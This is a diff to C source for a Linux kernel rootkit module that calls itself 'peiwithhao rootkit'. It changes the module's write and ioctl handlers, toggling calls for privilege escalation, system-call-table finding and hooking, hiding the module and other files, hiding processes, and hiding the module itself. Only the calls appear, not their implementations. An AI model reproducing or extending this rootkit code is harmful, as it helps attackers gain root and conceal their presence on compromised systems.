@@ -27,9 +27,11 @@ ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff
     return count;
 }
 ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
-    privileged_escalation();
-    module_toggle();
+    // privileged_escalation();
+    hookpoint_del_all();
+    // module_toggle();
     // printk(KERN_INFO "[peiwithhao rootkit] write");
+
     return count;
 }
 
@@ -51,11 +53,12 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            file_hidden("pwhkit.ko");
-            file_hidden("use");
-            file_hidden("sys_table_finder");
-            process_hidden(1);
-            process_hidden(2);
+            // file_hidden("pwhkit.ko");
+            // file_hidden("use");
+            // file_hidden("sys_table_finder");
+            module_toggle();
+            // process_hidden(1);
+            // process_hidden(2);
 
             // dir_hidden_weak("haaaa");
 
